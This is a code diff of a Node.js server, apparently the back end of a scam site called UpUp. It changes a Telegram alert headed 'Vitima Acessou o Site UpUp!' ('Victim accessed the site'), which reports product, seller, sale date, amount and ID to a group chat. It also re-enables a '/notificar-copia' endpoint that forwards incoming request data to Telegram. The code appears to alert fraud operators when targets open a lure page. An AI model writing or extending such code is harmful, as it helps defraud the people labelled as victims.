@@ -248,15 +248,16 @@ if (process.env.NODE_ENV === 'production') {
         return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&");
     }
     
+  
     const mensagemProduto = `
     🎰 Vitima Acessou o Site UpUp!
-    - 📌 Produto: ${escapeMarkdownV2(produto.nome)}
-    - 👤 Usuário: ${escapeMarkdownV2(produto.username)}
-    - 🏷️ Vendedor: ${escapeMarkdownV2(produto.vendedor)}
-    - 📅 Data da Venda: ${escapeMarkdownV2(produto.dataVenda)}
-    - 🏦 Valor: R$ ${escapeMarkdownV2(produto.valor)}
-    - 🆔️ ID: ${escapeMarkdownV2(produto.actionId)}
-    `;
+    - 📌 Produto: ${produto.nome}
+    - 🏷️ Vendedor: ${produto.vendedor}
+    - 📅 Data da Venda: ${produto.dataVenda}
+    - 🏦 Valor: R$ ${produto.valor}
+    - 🆔️ ID: ${produto.actionId}
+  `;
+
   
     // Envia a mensagem para o grupo do Telegram
     bot.telegram.sendMessage(GROUP_CHAT_ID, mensagemProduto, { parse_mode: "Markdown" });
@@ -1017,7 +1018,7 @@ function escapeMarkdownV2(text) {
     return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&");
 }
 
-/*
+
 app.post("/notificar-copia", async (req, res) => {
     console.log("📩 Dados recebidos no servidor:", req.body);
 
@@ -1056,7 +1057,7 @@ app.post("/notificar-copia", async (req, res) => {
         console.error("❌ Erro ao enviar notificação:", error);
         res.status(500).json({ error: "Erro ao notificar no Telegram." });
     }
-});*/
+});
 
 
 app.get('/analise', async (req, res) => {
